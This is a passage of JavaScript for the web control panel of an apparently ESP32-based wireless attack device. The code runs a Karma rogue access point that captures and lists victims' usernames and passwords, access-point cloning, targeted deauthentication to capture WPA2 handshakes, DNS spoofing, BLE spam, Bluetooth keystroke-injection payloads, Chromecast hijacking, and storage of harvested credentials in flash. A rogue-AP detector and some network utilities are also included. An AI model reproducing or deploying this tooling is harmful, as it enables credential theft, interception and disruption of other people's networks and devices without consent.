  await fetch('/apc_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({all:false})});
}
async function toggleAPClone(){
  await post('/cmd',{cmd:'atk_ap_clone',index:-1});
  atkState.apc=!atkState.apc;
  setAtkBtn('apc',atkState.apc);
  if(atkState.apc){
    const sel=apcResults.filter(a=>a.sel).map(a=>a.ssid);
    document.getElementById('apc-status').textContent='Cloning: '+sel.join(', ');
  }
}
let karmaPoller=null;
let karmaTargets=[];

async function karmaScan(){
  const btn=document.getElementById('karma-scan-btn');
  const sta=document.getElementById('karma-status');
  btn.disabled=true; sta.textContent='Scanning...';
  await post('/cmd',{cmd:'atk_karma_scan',index:-1});
  await new Promise(r=>setTimeout(r,5000));
  try{
    const r=await fetch('/karma_scan');
    if(r.ok){
      karmaTargets=await r.json();
      renderKarmaList();
      sta.textContent=karmaTargets.length+' networks found -- pick targets';
    }
  }catch(e){sta.textContent='Scan failed';}
  btn.disabled=false;
}
function renderKarmaList(){
  const el=document.getElementById('karma-list');
  el.style.display='block';
  if(karmaTargets.length===0){el.innerHTML='<div style="color:var(--dim);padding:8px">No networks found</div>';return;}
  el.innerHTML=karmaTargets.map(t=>`
    <label style="display:flex;align-items:center;gap:8px;padding:5px 4px;cursor:pointer;border-bottom:1px solid var(--border)">
      <input type="checkbox" data-idx="${t.idx}" ${t.sel?'checked':''} onchange="karmaToggle(${t.idx},this.checked)">
      <span style="flex:1;color:var(--txt)">${t.ssid}</span>
    </label>`).join('');
}
async function karmaToggle(idx,on){
  karmaTargets[idx].sel=on;
  await fetch('/karma_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({idx:idx,on:on})});
}
async function karmaSelectAll(){
  karmaTargets.forEach(t=>t.sel=true); renderKarmaList();
  await fetch('/karma_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({all:true})});
}
async function karmaSelectNone(){
  karmaTargets.forEach(t=>t.sel=false); renderKarmaList();
  await fetch('/karma_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({all:false})});
}
async function toggleKarma(){
  if(atkState.karma){
    await post('/cmd',{cmd:'atk_karma',index:-1});
    atkState.karma=false; setAtkBtn('karma',false); clearActiveAttack();
    if(karmaPoller){clearInterval(karmaPoller);karmaPoller=null;}
    document.getElementById('karma-status').textContent='Stopped';
    return;
  }
  await stopActiveAttack(); setActiveAttack('atk_karma_stop','Karma Attack');
  let realState=false;
  try{const s=await fetch('/karma_state');if(s.ok){const j=await s.json();realState=j.running;}}catch(e){}
  await post('/cmd',{cmd:'atk_karma',index:-1});
  atkState.karma=!realState;
  setAtkBtn('karma',atkState.karma);
  if(atkState.karma){
    document.getElementById('karma-status').textContent='Listening for probes...';
    document.getElementById('karma-creds-wrap').style.display='block';
    karmaPoller=setInterval(pollKarmaCreds,3000);
    pollKarmaCreds();
  } else {
    document.getElementById('karma-status').textContent='Stopped';
    if(karmaPoller){clearInterval(karmaPoller);karmaPoller=null;}
  }
}
async function pollKarmaCreds(){
  try{
    const [r1,r2]=await Promise.all([fetch('/karma_creds'),fetch('/karma_conns')]);
    if(!r1.ok)return;
    const creds=await r1.json();
    const conns=r2.ok?await r2.json():[];
    const body=document.getElementById('karma-creds-body');
    const cl=document.getElementById('karma-conns-list');
    if(!body)return;
    // Show connections
    if(cl && conns.length>0){
      cl.innerHTML=conns.map(cn=>`
        <div style="padding:3px 6px;border-bottom:1px solid var(--border)">
          <span style="color:var(--blue);font-family:monospace;font-size:.72rem">${cn.mac}</span>
          <span style="color:var(--dim);font-size:.7rem"> ${cn.ip} </span>
          <span style="color:var(--yellow);font-size:.65rem">${cn.ssid}</span>
          <span style="color:var(--dim);font-size:.62rem"> ${(cn.ua||'').substring(0,45)}</span>
        </div>`).join('');
    }
    // Show credentials
    if(creds.length===0){
      body.innerHTML='<tr><td colspan="5" style="color:var(--dim);padding:8px;text-align:center">No credentials yet...</td></tr>';
    } else {
      body.innerHTML=creds.map(c=>`
        <tr style="border-top:1px solid var(--border)">
          <td style="padding:5px 8px;color:var(--yellow)">${c.ssid}</td>
          <td style="padding:5px 8px">${c.ip}</td>
          <td style="padding:5px 8px;color:var(--dim)">${c.mac}</td>
          <td style="padding:5px 8px;color:var(--green)">${c.user}</td>
          <td style="padding:5px 8px;color:var(--red)">${c.pass}</td>
        </tr>`).join('');
      document.getElementById('karma-status').textContent=creds.length+' credential(s) captured';
    }
  }catch(e){}
}
// -- Logs ------------------------------------------------------------------
let logEntries = [];
function addLog(type, msg){
  const ts = new Date().toLocaleTimeString();
  logEntries.unshift({ts, type, msg});
  if(logEntries.length > 200) logEntries.pop();
  renderLogs();
}
function renderLogs(){
  const el = document.getElementById('log-list');
  const cnt = document.getElementById('log-count');
  if(!el) return;
  if(cnt) cnt.textContent = logEntries.length + ' events';
  if(!logEntries.length){
    el.innerHTML='<div style="color:var(--dim);padding:12px;text-align:center">No events yet</div>';
    return;
  }
  const colours = {atk:'var(--red)',scan:'var(--green)',tool:'var(--accent)',
                   cred:'var(--yellow)',info:'var(--dim)'};
  el.innerHTML = logEntries.map(e=>`
    <div style="padding:6px 8px;border-bottom:1px solid var(--border);display:flex;gap:8px">
      <span style="color:var(--dim);flex-shrink:0">${e.ts}</span>
      <span style="color:${colours[e.type]||'var(--txt)'}">${e.msg}</span>
    </div>`).join('');
}
function clearLogs(){ logEntries=[]; renderLogs(); }

// -- Tools - MAC Lookup -----------------------------------------------------
const MAC_OUI = {
  'FC:EC:DA':'Espressif','AC:67:B2':'Espressif','24:6F:28':'Espressif',
  '00:1A:79':'Apple','00:17:F2':'Apple','34:C0:59':'Apple',
  'A4:C3:F0':'Apple','DC:2B:61':'Apple','F8:1E:DF':'Apple',
  'B8:27:EB':'Raspberry Pi','DC:A6:32':'Raspberry Pi',
  '00:50:56':'VMware','00:0C:29':'VMware',
  '08:00:27':'VirtualBox','0A:00:27':'VirtualBox',
  '00:15:5D':'Microsoft Hyper-V',
  '44:38:39':'Cumulus Networks','00:16:3E':'Xen',
};
function lookupMAC(){
  const mac = document.getElementById('mac-input').value.trim().toUpperCase();
  const el = document.getElementById('mac-result');
  el.style.display='block';
  if(mac.length < 8){ el.textContent='Enter at least 6 hex chars'; el.style.color='var(--red)'; return; }
  const oui = mac.substring(0,8).replace(/-/g,':');
  const vendor = MAC_OUI[oui];
  if(vendor){
    el.innerHTML=`&#10003; <span style="color:var(--green)">${vendor}</span> &mdash; ${oui}`;
    addLog('tool','MAC lookup: '+oui+' = '+vendor);
  } else {
    el.innerHTML=`<span style="color:var(--dim)">Unknown vendor for ${oui} -- may be locally administered</span>`;
  }
}

// -- Tools - Ping -----------------------------------------------------------
async function doPing(){
  const target = document.getElementById('ping-target').value.trim();
  const el = document.getElementById('ping-result');
  if(!target){ return; }
  el.style.display='block';
  el.innerHTML='<span style="color:var(--dim)">Pinging '+target+'...</span>';
  const t0 = Date.now();
  try{
    const r = await fetch('http://'+target, {mode:'no-cors',signal:AbortSignal.timeout(3000)});
    const ms = Date.now()-t0;
    el.innerHTML='&#10003; <span style="color:var(--green)">Reachable</span> &mdash; '+ms+'ms';
    addLog('tool','Ping '+target+': reachable ('+ms+'ms)');
  }catch(e){
    const ms = Date.now()-t0;
    if(ms < 3000){
      el.innerHTML='&#10003; <span style="color:var(--yellow)">CORS block (host exists)</span> &mdash; '+ms+'ms';
      addLog('tool','Ping '+target+': CORS block (host likely up)');
    } else {
      el.innerHTML='&#10007; <span style="color:var(--red)">Unreachable / timeout</span>';
      addLog('tool','Ping '+target+': timeout');
    }
  }
}

// -- Tools - Packet Counter ------------------------------------------------
// -- RSSI Signal Meter -----------------------------------------------------
let rssiRunning=false, rssiPoller=null, rssiTarget='';
function populateRSSISelect(){
  const sel=document.getElementById('rssi-sel');
  if(!sel||!wD.length) return;
  sel.innerHTML='<option value="">-- Select network --</option>' +
    wD.map(n=>`<option value="${n.s}">${n.s} (${n.r}dBm)</option>`).join('');
}
async function toggleRSSIMeter(){
  rssiRunning=!rssiRunning;
  const btn=document.getElementById('rssi-btn');
  const wrap=document.getElementById('rssi-bar-wrap');
  if(rssiRunning){
    // Auto-populate if no scan data yet
    if(!wD.length){
      rssiRunning=false;
      const sta=document.getElementById('rssi-status');
      if(sta){sta.textContent='Scanning for networks first...';sta.style.color='var(--yellow)';}
      await doCmd('scan_wifi');
      setTimeout(()=>{populateRSSISelect();if(sta)sta.textContent='';},4000);
      return;
    }
    populateRSSISelect();
    rssiTarget=document.getElementById('rssi-sel').value;
    if(!rssiTarget){rssiRunning=false;return;}
    btn.textContent='&#9632; Stop'; wrap.style.display='block';
    rssiPoller=setInterval(updateRSSI,1000);
    updateRSSI();
  } else {
    btn.textContent='&#9654; Track'; wrap.style.display='none';
    if(rssiPoller){clearInterval(rssiPoller);rssiPoller=null;}
  }
}
function updateRSSI(){
  const net=wD.find(n=>n.s===rssiTarget);
  if(!net) return;
  const rssi=net.r;
  // Map -30 (great) to -90 (terrible) onto 0-100%
  const pct=Math.max(0,Math.min(100,Math.round((rssi+90)/60*100)));
  const bar=document.getElementById('rssi-bar');
  const val=document.getElementById('rssi-val');
  if(bar){ bar.style.width=pct+'%'; bar.style.background=pct>60?'var(--green)':pct>30?'var(--yellow)':'var(--red)'; }
  if(val) val.textContent=rssi+' dBm';
}

// -- WiFi Join -------------------------------------------------------------
async function joinWifi(){
  const ssid=document.getElementById('join-ssid').value.trim();
  const pass=document.getElementById('join-pass').value;
  const sta=document.getElementById('join-status');
  if(!ssid){sta.textContent='Enter SSID';sta.style.color='var(--red)';return;}
  sta.textContent='Connecting...';sta.style.color='var(--dim)';
  const r=await post('/cmd',{cmd:'select_wifi',index:-1,strVal:ssid+'|'+pass});
  if(r){
    sta.textContent='Connected to '+ssid;sta.style.color='var(--green)';
    addLog('info','Joined WiFi: '+ssid);
  } else {
    sta.textContent='Failed to connect';sta.style.color='var(--red)';
  }
}

// -- SSID Confusion --------------------------------------------------------
async function toggleSSIDConf(){
  if(atkState.ssidconf){
    await post('/cmd',{cmd:'atk_ssid_conf',index:-1});
    atkState.ssidconf=false; setAtkBtn('ssid-conf',false); clearActiveAttack();
    return;
  }
  await stopActiveAttack(); setActiveAttack('atk_ssid_conf_stop','SSID Confusion');
  await post('/cmd',{cmd:'atk_ssid_conf',index:-1});
  atkState.ssidconf = !atkState.ssidconf;
  setAtkBtn('ssid-conf', atkState.ssidconf);
}

let pktRunning=false, pktPoller=null, pktTotal=0, pktMgmt=0, pktData=0, pktCtrl=0;
async function togglePacketCount(){
  pktRunning=!pktRunning;
  const btn=document.getElementById('pkt-btn');
  const sta=document.getElementById('pkt-status');
  if(pktRunning){
    pktTotal=pktMgmt=pktData=pktCtrl=0;
    btn.textContent='&#9632; Stop'; btn.className='btn btn-red';
    sta.textContent='Counting...';
    await post('/cmd',{cmd:'packet_count_start',index:-1});
    pktPoller=setInterval(fetchPacketCount,1000);
  } else {
    btn.textContent='&#9654; Start'; btn.className='btn btn-scan';
    sta.textContent='';
    if(pktPoller){clearInterval(pktPoller);pktPoller=null;}
    await post('/cmd',{cmd:'packet_count_stop',index:-1});
    addLog('tool','Packet count: '+pktTotal+' total (M:'+pktMgmt+' D:'+pktData+' C:'+pktCtrl+')');
  }
}
async function fetchPacketCount(){
  try{
    const r=await fetch('/pkt_count');if(!r.ok)return;
    const d=await r.json();
    document.getElementById('pkt-mgmt').textContent=d.mgmt||0;
    document.getElementById('pkt-data').textContent=d.data||0;
    document.getElementById('pkt-ctrl').textContent=d.ctrl||0;
    document.getElementById('pkt-total').textContent=d.total||0;
    pktTotal=d.total||0; pktMgmt=d.mgmt||0; pktData=d.data||0; pktCtrl=d.ctrl||0;
  }catch(e){}
}

async function toggleBLESpam(){
  await post('/cmd',{cmd:'atk_ble_spam',index:-1});
  atkState.bles=!atkState.bles;
  setAtkBtn('bles',atkState.bles);
}
let eapolPoller=null;
async function toggleBLESpamAll(){
  const mode=parseInt(document.getElementById('blesa-mode').value);
  await post('/cmd',{cmd:'atk_ble_spam_all',index:mode});
  atkState.blesa=!atkState.blesa;
  setAtkBtn('blesa',atkState.blesa);
}
async function setEapolChannel(ch){
  await post('/cmd',{cmd:'eapol_set_ch',index:parseInt(ch)});
  const sta=document.getElementById('eapol-status');
  if(sta) sta.textContent = ch=='0' ? 'Hopping all channels' : 'Locked to ch'+ch;
}
function eapolPopulateTargets(){
  // Fill the target dropdown from the WiFi scan results (wD array)
  const sel = document.getElementById('eapol-target-sel');
  if(!sel || !wD.length) return;
  sel.innerHTML = '<option value="">-- Select target AP --</option>' +
    wD.map(n=>`<option value="${n.b}|${n.ch}">${n.s} (${n.b}) ch${n.ch}</option>`).join('');
}
async function eapolTargeted(){
  const sel = document.getElementById('eapol-target-sel');
  if(!sel || !sel.value){ alert('Select a target AP first (scan WiFi tab first)'); return; }
  const [bssid, ch] = sel.value.split('|');
  const sta = document.getElementById('eapol-targeted-status');
  const eapolSta = document.getElementById('eapol-status');
  // Make sure EAPOL sniffer is running
  if(!atkState.eapol){
    await post('/cmd',{cmd:'atk_eapol',index:-1});
    atkState.eapol=true;
    setAtkBtn('eapol',true);
    await new Promise(r=>setTimeout(r,300));
  }
  // Send targeted command
  await post('/cmd',{cmd:'eapol_targeted',index:parseInt(ch),strVal:bssid});
  if(sta){ sta.style.display='block'; }
  if(eapolSta){ eapolSta.textContent='Deauthing '+bssid+' ch'+ch+'... (~8s)'; }
  addLog('atk','EAPOL targeted: '+bssid+' ch'+ch);
  // Hide status after 9 seconds
  setTimeout(()=>{
    if(sta) sta.style.display='none';
    if(eapolSta) eapolSta.textContent='Targeted capture complete — check list below';
  }, 9000);
}
async function toggleEapol(){
  await post('/cmd',{cmd:'atk_eapol',index:-1});
  atkState.eapol=!atkState.eapol;
  setAtkBtn('eapol',atkState.eapol);
  if(atkState.eapol){
    document.getElementById('eapol-list').style.display='block';
    document.getElementById('eapol-status').textContent='Hopping channels...';
    eapolPoller=setInterval(pollEapol,2000);
  } else {
    if(eapolPoller){clearInterval(eapolPoller);eapolPoller=null;}
    document.getElementById('eapol-status').textContent='Stopped';
  }
}
async function togglePineapple(){
  await post('/cmd',{cmd:'atk_pineapple',index:-1});
  atkState.pine=!atkState.pine;
  const btn=document.getElementById('pine-btn');
  const sta=document.getElementById('pine-status');
  const list=document.getElementById('pine-list');
  if(atkState.pine){
    btn.textContent='&#9632; Stop';btn.className='btn btn-red';
    sta.textContent='Scanning every 15s...';list.style.display='block';
    atkState.pinePoller=setInterval(pollPineapple,5000);
  } else {
    btn.textContent='&#9654; Start Scanning';btn.className='btn btn-scan';
    sta.textContent='Stopped';
    if(atkState.pinePoller){clearInterval(atkState.pinePoller);}
  }
}
async function pollPineapple(){
  try{
    const r=await fetch('/pine_results');if(!r.ok)return;
    const aps=await r.json();
    const el=document.getElementById('pine-list');if(!el)return;
    document.getElementById('pine-status').textContent=aps.length?aps.length+' suspicious found':'Scanning...';
    if(!aps.length)return;
    el.innerHTML=aps.map(a=>`
      <div style="padding:8px;border-bottom:1px solid var(--border);margin-bottom:4px">
        <div style="color:var(--red);font-weight:600">&#9888; ${a.ssid}</div>
        <div style="color:var(--dim);margin-top:2px">${a.bssid} &bull; ch${a.ch} &bull; ${a.rssi}dBm</div>
        <div style="color:var(--yellow);font-size:.75rem;margin-top:2px">${a.reason}</div>
      </div>`).join('');
  }catch(e){}
}

let ccDevices=[];
async function ccScan(){
  const btn=document.getElementById('cc-scan-btn');
  const sta=document.getElementById('cc-status');
  btn.disabled=true;sta.textContent='Discovering...';
  await post('/cmd',{cmd:'atk_cc_scan',index:-1});
  await new Promise(r=>setTimeout(r,4000));
  try{
    const r=await fetch('/cc_devices');
    if(r.ok){
      ccDevices=await r.json();
      const el=document.getElementById('cc-list');
      if(ccDevices.length){
        el.style.display='block';
        el.innerHTML=ccDevices.map((d,i)=>`
          <div style="display:flex;justify-content:space-between;align-items:center;
               padding:8px;background:var(--panel2);border-radius:8px;margin-bottom:6px">
            <div>
              <div style="color:var(--txt);font-weight:500">${d.name}</div>
              <div style="color:var(--dim);font-size:.75rem">${d.ip}</div>
            </div>
            <button class="btn" style="border-color:var(--red);color:var(--red)"
              onclick="ccRickRollOne(${i})">&#127925; Rick Roll</button>
          </div>`).join('');
        document.getElementById('cc-rickroll-btn').style.display='';
        sta.textContent=ccDevices.length+' device(s) found';
      } else {
        sta.textContent='No Chromecast devices found';
      }
    }
  }catch(e){sta.textContent='Discovery failed';}
  btn.disabled=false;
}
async function ccRickRoll(){
  await post('/cmd',{cmd:'atk_cc_rickroll',index:-1});
  document.getElementById('cc-status').textContent='Rick Rolling all devices!';
}
async function ccRickRollOne(idx){
  await post('/cmd',{cmd:'atk_cc_rickroll',index:idx});
}

async function pollEapol(){
  try{
    const r=await fetch('/eapol_caps');
    if(!r.ok)return;
    const d=await r.json();
    // New format is {channel, count, caps:[]} - old format was array
    const caps = Array.isArray(d) ? d : (d.caps||[]);
    const ch   = d.channel || 0;
    const el=document.getElementById('eapol-list');
    if(!el)return;
    // Show current channel being monitored
    const sta=document.getElementById('eapol-status');
    if(sta){
      const chStr = ch ? ` — ch${ch}` : '';
      sta.textContent = caps.length+' handshake(s) captured'+chStr;
    }
    if(caps.length===0){
      el.innerHTML='<div style="color:var(--dim);padding:8px">No handshakes yet — connect a device to a nearby WPA2 network</div>';
      return;
    }
    el.innerHTML=caps.map(c=>`
      <div style="padding:6px 4px;border-bottom:1px solid var(--border)">
        <span style="color:var(--green);font-weight:600">M${c.type}</span>
        <span style="color:var(--dim)"> ch${c.ch} </span>
        <span style="color:var(--txt)">${c.client}</span>
        <span style="color:var(--dim)"> -&gt; AP: </span>
        <span style="color:var(--yellow)">${c.ap}</span>
      </div>`).join('');
  }catch(e){}
}

// ── Demo Mode ────────────────────────────────────────────────────────────
let demoActive = false;
async function runDemo(){
  if(demoActive) return;
  demoActive = true;
  const btn = document.getElementById('demo-btn');
  btn.textContent='&#9209; Running...'; btn.style.color='var(--red)';
  addLog('info','=== DEMO MODE STARTED ===');

  // Step 1: WiFi scan
  navTo('wifi');
  addLog('scan','Demo: Scanning for WiFi networks...');
  await doCmd('scan_wifi');
  await new Promise(r=>setTimeout(r,4000));

  // Step 2: Show results, go to dashboard
  navTo('dash');
  addLog('scan','Demo: WiFi scan complete — ' + wD.length + ' networks found');
  await new Promise(r=>setTimeout(r,1500));

  // Step 3: Start beacon spam
  navTo('attacks');
  addLog('atk','Demo: Starting Beacon Spam...');
  await post('/cmd',{cmd:'atk_beacon_random',index:-1});
  atkState.bsr=true; setAtkBtn('bsr',true);
  await new Promise(r=>setTimeout(r,8000));

  // Step 4: Start BLE spam
  addLog('atk','Demo: Starting BLE Spam...');
  await post('/cmd',{cmd:'atk_ble_spam_all',index:3});
  atkState.blesa=true; setAtkBtn('blesa',true);
  await new Promise(r=>setTimeout(r,8000));

  // Step 5: Stop everything
  addLog('info','Demo: Stopping all attacks...');
  await stopAllAttacks();
  navTo('logs');

  addLog('info','=== DEMO MODE COMPLETE ===');
  btn.textContent='&#9654; DEMO MODE'; btn.style.color='var(--yellow)';
  demoActive = false;
}
// ─────────────────────────────────────────────────────────────────────────

setInterval(poll,2000);

// Session persists while tab is open - no auto-lock on hide
poll();

// -- Web UI PIN ------------------------------------------------------------
async function setWebPin(){
  const pin = document.getElementById('webpin-new').value.trim();
  const sta = document.getElementById('webpin-status');
  if(pin.length > 0 && (pin.length !== 4 || !/^[0-9]{4}$/.test(pin))){
    sta.textContent = 'PIN must be exactly 4 digits'; sta.style.color='var(--red)'; return;
  }
  const r = await post('/cmd',{cmd:'set_pin',index:-1,strVal:pin});
  if(r){
    sta.textContent = pin.length ? 'PIN set -- will apply next reload' : 'PIN disabled';
    sta.style.color = 'var(--green)';
    document.getElementById('webpin-new').value = '';
    addLog('info', pin.length ? 'Web UI PIN updated' : 'Web UI PIN disabled');
  } else {
    sta.textContent = 'Failed to set PIN'; sta.style.color='var(--red)';
  }
}

// -- Theme toggle -----------------------------------------------------------
function toggleTheme(){
  const light = document.documentElement.classList.toggle('light');
  localStorage.setItem('theme', light ? 'light' : 'dark');
  document.getElementById('theme-btn').textContent = light ? '&#9728;' : '&#9790;';
}
(function(){
  if(localStorage.getItem('theme')==='light'){
    document.documentElement.classList.add('light');
    const b = document.getElementById('theme-btn');
    if(b) b.textContent='&#9728;';
  }
})();

// -- Session persistence -- sync button states from ESP on load --------------
async function syncState(){
  try{
    const r = await fetch('/full_state');
    if(!r.ok) return;
    const s = await r.json();
    // Sync attack states
    const map = {bsl:'bsl',bsr:'bsr',rr:'rr',pf:'pf',apc:'apc',
                 karma:'karma',bles:'bles',blesa:'blesa',eapol:'eapol',pine:'pine'};
    for(const [key,id] of Object.entries(map)){
      if(s[key] !== undefined){
        atkState[key] = s[key];
        setAtkBtn(id, s[key]);
      }
    }
    // Sync karma creds if running
    if(s.karma){ document.getElementById('karma-creds-wrap').style.display='block'; pollKarmaCreds(); }
    // Update dashboard
    if(s.heap) document.getElementById('d-heap').textContent = Math.round(s.heap/1024)+'KB';
    if(s.ip)   document.getElementById('d-ip').textContent   = s.ip;
    addLog('info','Session restored from device');
  }catch(e){}
}
syncState();

// -- Active attacks dashboard indicator ------------------------------------
function updateActiveAttacks(){
  const active = [];
  if(atkState.bsl)   active.push('Beacon List');
  if(atkState.bsr)   active.push('Beacon Random');
  if(atkState.rr)    active.push('Rick Roll');
  if(atkState.karma) active.push('Karma');
  if(atkState.bles)  active.push('BLE Spam iOS');
  if(atkState.blesa) active.push('BLE Spam All');
  if(atkState.eapol) active.push('EAPOL Sniffer');
  if(atkState.pine)  active.push('Pineapple Detect');
  const wrap = document.getElementById('dash-active');
  const list = document.getElementById('dash-active-list');
  if(!wrap) return;
  if(active.length){
    wrap.style.display='block';
    list.textContent = active.join('  &middot;  ');
  } else {
    wrap.style.display='none';
  }
  const logCnt = document.getElementById('d-log-cnt');
  if(logCnt) logCnt.textContent = logEntries.length;
}
setInterval(updateActiveAttacks, 1000);

// -- Dashboard clock --------------------------------------------------------
let startTime = Date.now();
function updateClock(){
  const el = document.getElementById('dash-time');
  if(!el) return;
  el.textContent = new Date().toLocaleTimeString();
  const up = Math.floor((Date.now()-startTime)/1000);
  const upEl = document.getElementById('d-uptime');
  if(upEl) upEl.textContent = up<60 ? up+'s' : up<3600 ? Math.floor(up/60)+'m' : Math.floor(up/3600)+'h';
}
setInterval(updateClock,1000);
updateClock();

// -- Auto-reconnect ---------------------------------------------------------
let offlineSince = 0;
let reconnectBanner = null;
function showReconnectBanner(show){
  let banner = document.getElementById('reconnect-banner');
  if(show && !banner){
    banner = document.createElement('div');
    banner.id='reconnect-banner';
    banner.style.cssText='position:fixed;top:0;left:0;right:0;padding:10px;text-align:center;'+
      'background:rgba(255,61,90,.9);color:#fff;font-size:.82rem;font-weight:600;z-index:9999';
    banner.innerHTML='&#9888; Connection lost -- reconnecting... <span id="reconnect-count"></span>';
    document.body.prepend(banner);
  } else if(!show && banner){
    banner.remove();
  }
}
const origOnline = window.online || (function(){});
function online(ok){
  document.getElementById('dot').className=ok?'on':'off';
  document.getElementById('slabel').textContent=ok?'connected':'offline';
  if(!ok){
    if(!offlineSince) offlineSince=Date.now();
    showReconnectBanner(true);
  } else {
    offlineSince=0;
    showReconnectBanner(false);
    if(document.getElementById('reconnect-banner')) syncState();
  }
}

// -- Export logs ------------------------------------------------------------
function exportLogs(){
  if(!logEntries.length){ alert('No logs to export'); return; }
  const csv = 'Time,Type,Event\n' +
    logEntries.map(e=>`"${e.ts}","${e.type}","${e.msg.replace(/"/g,"'")}"`).join('\n');
  const blob = new Blob([csv],{type:'text/csv'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href=url; a.download='esp32_cyber_logs_'+Date.now()+'.csv';
  a.click(); URL.revokeObjectURL(url);
  addLog('info','Logs exported to CSV');
}

// -- Demo mode --------------------------------------------------------------
let demoRunning=false;
const demoSteps=[
  {msg:'Demo: Starting WiFi scan...',       fn:()=>doCmd('scan_wifi'),  wait:4000},
  {msg:'Demo: Starting Beacon Spam Random...',fn:()=>post('/cmd',{cmd:'atk_beacon_random',index:-1}), wait:3000},
  {msg:'Demo: Starting BLE Spam (All)...',  fn:()=>post('/cmd',{cmd:'atk_ble_spam_all',index:3}),    wait:3000},
  {msg:'Demo: Starting EAPOL Sniffer...',   fn:()=>post('/cmd',{cmd:'atk_eapol',index:-1}),          wait:5000},
  {msg:'Demo: Stopping all attacks...',     fn:stopAllAttacks, wait:1000},
  {msg:'Demo: Complete!',                   fn:()=>addLog('info','Demo mode complete'), wait:0},
];
async function runDemo(){
  if(demoRunning){ alert('Demo already running'); return; }
  demoRunning=true;
  addLog('info','Demo mode started');
  navTo('dash');
  for(const step of demoSteps){
    addLog('info', step.msg);
    await step.fn();
    if(step.wait) await new Promise(r=>setTimeout(r,step.wait));
  }
  demoRunning=false;
}
async function stopAllAttacks(){
  const attacks=['atk_beacon_random','atk_ble_spam_all','atk_eapol'];
  for(const a of attacks){
    const key=a.replace('atk_','').replace(/_./g,c=>c[1].toUpperCase());
    if(atkState[key]) await post('/cmd',{cmd:a,index:-1});
  }
  addLog('info','All attacks stopped');
}


// -- Bad BLE --
let badBLERunning=false;
let _badBLEPoller=null;
async function updateBadBLEStatus(){
  const r=await get('/badble_state');
  if(!r) return;
  const el=document.getElementById('badble-status');
  if(el){
    let color='var(--dim)';
    if(r.running&&!r.connected) color='var(--yellow)';
    if(r.connected) color='var(--green)';
    if(r.busy) color='var(--orange)';
    if(r.status&&r.status.startsWith('Done')) color='var(--accent)';
    el.style.color=color;
    el.textContent=r.status||'Idle';
  }
}
async function toggleBadBLE(){
  const name=document.getElementById('ble-devname').value||'Magic Keyboard';
  const btn=document.getElementById('badble-adv-btn');
  const sta=document.getElementById('badble-status');
  badBLERunning=!badBLERunning;
  await post('/cmd',{cmd:badBLERunning?'badble_start':'badble_stop',index:-1,strVal:name});
  if(badBLERunning){
    if(_badBLEPoller) clearInterval(_badBLEPoller);
    _badBLEPoller=setInterval(updateBadBLEStatus,500);
  } else {
    if(_badBLEPoller){clearInterval(_badBLEPoller);_badBLEPoller=null;}
  }
  btn.textContent=badBLERunning?'&#9632; Stop':'&#128246; Advertise';
  btn.style.borderColor=badBLERunning?'var(--red)':'var(--accent)';
  btn.style.color=badBLERunning?'var(--red)':'var(--accent)';
  sta.textContent=badBLERunning?'Advertising as "'+name+'" -- pair from target device Bluetooth settings':'Stopped';
  if(!badBLERunning) return;
  // Poll status
  setInterval(async function(){
    if(!badBLERunning) return;
    const r=await fetch('/badble_state');if(!r.ok)return;
    const s=await r.json();
    document.getElementById('badble-status').textContent=s.status||'';
    if(s.connected) document.getElementById('badble-status').style.color='var(--green)';
  },2000);
}
async function runBadBLE(){
  const pid=parseInt(document.getElementById('badble-payload').value);
  const custom=document.getElementById('badble-custom').value;
  const sta=document.getElementById('badble-status');
  sta.textContent='Running payload...';
  await post('/cmd',{cmd:'badble_run',index:pid,strVal:custom});
  addLog('atk','BadBLE payload #'+pid+' sent');
}
// Show/hide custom script textarea
document.addEventListener('DOMContentLoaded',function(){
  const sel=document.getElementById('badble-payload');
  const ta=document.getElementById('badble-custom');
  if(sel&&ta) sel.addEventListener('change',function(){
    ta.style.display=this.value==='0'?'block':'none';
  });
});

// -- DNS Spoof --
let dnsRunning=false;
async function toggleDNSSpoof(){
  await post('/cmd',{cmd:dnsRunning?'dns_stop':'dns_start',index:-1});
  dnsRunning=!dnsRunning;
  const btn=document.getElementById('dns-btn');
  const sta=document.getElementById('dns-status');
  btn.textContent=dnsRunning?'Stop':'Start';
  btn.style.color=dnsRunning?'var(--red)':'var(--orange)';
  btn.style.borderColor=dnsRunning?'var(--red)':'var(--orange)';
  sta.textContent=dnsRunning?'Intercepting all DNS queries...':'Stopped';
  addLog('atk','DNS Spoof '+(dnsRunning?'started':'stopped'));
}

// -- Stored Credentials --
async function loadStoredCreds(){
  const el=document.getElementById('stored-creds-list');
  el.innerHTML='<div style="color:var(--dim);padding:8px">Loading...</div>';
  try{
    const r=await fetch('/stored_creds');
    if(!r.ok){el.innerHTML='<div style="color:var(--red);padding:8px">Failed</div>';return;}
    const creds=await r.json();
    if(!creds||!creds.length){el.innerHTML='<div style="color:var(--dim);padding:8px">No stored credentials</div>';return;}
    el.innerHTML=creds.map(c=>`
      <div style="padding:6px 4px;border-bottom:1px solid var(--border)">
        <span style="color:var(--yellow)">${c.ssid||c.type||'?'}</span>
        <span style="color:var(--dim);font-size:.7rem"> ${c.time||''}</span><br>
        <span style="color:var(--green)">${c.user||''}</span>
        <span style="color:var(--dim)"> / </span>
        <span style="color:var(--red)">${c.pass||''}</span>
        <span style="color:var(--dim);font-size:.7rem"> ${c.ip||''}</span>
      </div>`).join('');
  }catch(e){el.innerHTML='<div style="color:var(--red);padding:8px">Error</div>';}
}
async function clearStoredCreds(){
  if(!confirm('Clear all stored credentials from flash?'))return;
  await post('/cmd',{cmd:'clear_creds',index:-1});
  document.getElementById('stored-creds-list').innerHTML='<div style="color:var(--dim);padding:8px">Cleared</div>';
  addLog('info','Stored credentials cleared');
}

// -- OTA polling --
setInterval(async function(){
  try{
    const r=await fetch('/ota_state');if(!r.ok)return;
    const s=await r.json();
    const sta=document.getElementById('ota-status');
    const bar=document.getElementById('ota-bar');
    const prg=document.getElementById('ota-progress');
    if(s.updating){
      if(sta)sta.textContent='Updating: '+s.progress+'%';
      if(bar)bar.style.display='block';
      if(prg)prg.style.width=s.progress+'%';
    }else{
      if(sta)sta.textContent=s.ready?'Ready -- use Arduino IDE wireless upload':'Connect to WiFi first';
      if(bar)bar.style.display='none';
    }
  }catch(e){}
},3000);


// -- Deauth Attack --
